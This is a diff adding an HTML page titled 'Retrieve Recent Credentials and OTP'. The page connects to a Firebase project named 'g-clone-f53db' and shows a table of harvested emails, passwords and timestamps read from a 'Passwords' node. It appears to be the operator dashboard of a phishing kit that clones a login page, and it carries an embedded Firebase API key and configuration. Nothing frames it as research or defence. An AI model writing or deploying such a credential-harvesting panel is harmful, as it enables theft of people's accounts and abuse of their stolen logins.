@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Retrieve Recent Credentials and OTP</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 80%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        h1 {
+            font-size: 24px;
+            color: #333333;
+            text-align: center;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        th, td {
+            border: 1px solid #dddddd;
+            text-align: left;
+            padding: 8px;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+    </style>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
+        import { getDatabase, ref, get, query, orderByChild } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDzJSKTgfUFKZ3GLFP5rIprrNkY77lq7FA",
+            authDomain: "g-clone-f53db.firebaseapp.com",
+            databaseURL: "https://g-clone-f53db-default-rtdb.firebaseio.com",
+            projectId: "g-clone-f53db",
+            storageBucket: "g-clone-f53db.appspot.com",
+            messagingSenderId: "567090264097",
+            appId: "1:567090264097:web:31d4e3c99fcba6dc624b60",
+            measurementId: "G-YBG1228CM5"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        function displayAllCredentials() {
+            const passwordsRef = ref(database, 'Passwords/');
+            const passwordsQuery = query(passwordsRef, orderByChild('timestamp'));
+
+            get(passwordsQuery).then((snapshot) => {
+                if (snapshot.exists()) {
+                    const data = snapshot.val();
+                    const tableBody = document.getElementById('credentialsTableBody');
+
+                    for (const key in data) {
+                        const entryData = data[key];
+
+                        const row = document.createElement('tr');
+
+                        const emailCell = document.createElement('td');
+                        emailCell.textContent = entryData.email;
+
+                        const passwordCell = document.createElement('td');
+                        passwordCell.textContent = entryData.password;
+
+                        const timestampCell = document.createElement('td');
+                        timestampCell.textContent = new Date(entryData.timestamp).toLocaleString();
+
+                        row.appendChild(emailCell);
+                        row.appendChild(passwordCell);
+                        row.appendChild(timestampCell);
+
+                        tableBody.appendChild(row);
+                    }
+                } else {
+                    console.log("No passwords found.");
+                }
+            }).catch((error) => {
+                console.error("Error retrieving passwords: ", error);
+            });
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            console.log("Document loaded and script running.");
+            displayAllCredentials();
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>All Credentials</h1>
+        <table>
+            <thead>
+                <tr>
+                    <th>Email</th>
+                    <th>Password</th>
+                    <th>Timestamp</th>
+                </tr>
+            </thead>
+            <tbody id="credentialsTableBody">
+                <!-- Dynamic rows will be inserted here -->
+            </tbody>
+        </table>
+    </div>
+</body>
+</html>
